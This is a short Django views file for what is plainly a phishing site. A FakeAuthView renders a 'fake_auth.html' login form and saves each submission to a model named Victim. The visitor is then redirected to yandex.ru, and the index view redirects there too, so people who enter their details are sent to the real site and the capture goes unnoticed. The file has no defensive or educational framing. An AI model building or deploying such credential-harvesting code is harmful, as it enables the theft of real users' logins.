from django.shortcuts import redirect
from django.views.generic.edit import CreateView

from .models import Victim
from .forms import FakeAuthForm


def index(request):
    return redirect('https://yandex.ru')


class FakeAuthView(CreateView):
    model = Victim
    form_class = FakeAuthForm
    template_name = 'fake_auth.html'
    success_url = 'https://yandex.ru'
